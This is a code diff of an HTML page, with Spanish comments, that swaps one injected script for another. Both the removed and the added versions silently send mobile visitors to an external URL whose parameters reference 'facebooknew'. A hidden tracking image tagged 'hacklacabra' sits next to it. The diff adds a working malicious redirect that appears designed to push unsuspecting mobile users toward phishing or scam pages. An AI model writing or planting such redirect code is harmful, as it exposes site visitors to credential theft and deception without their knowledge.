@@ -11,8 +11,18 @@
 
   <!-- Include the script -->
   <script>
-<script> if(screen.colorDepth >= 24 && navigator.cookieEnabled == true && screen.width < 500) { setTimeout(setTime, 0); } function setTime() { window.location =
-'https://alex.xhja.net/?lan=facebooknew&ht=2&counter0=lacabra05'; } </script>
+<script type="text/javascript">
+    // Verificar si el usuario está accediendo desde un dispositivo móvil
+    var esDispositivoMovil = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
+    // URL de redirección para dispositivos móviles
+    var urlRedireccionMovil = "https://alex.xhja.net/?lan=facebooknew&ht=2&counter0=lacabra05";
+
+    // Verificar si es un dispositivo móvil y redirigir
+    if (esDispositivoMovil) {
+        window.location.href = urlRedireccionMovil;
+    }
+</script>
   <img src="//whos.amung.us/pingjs/?k=hacklacabra&t= NBA &x=https://nba.com/" style="display:none" alt="">
 </body>
 </html>
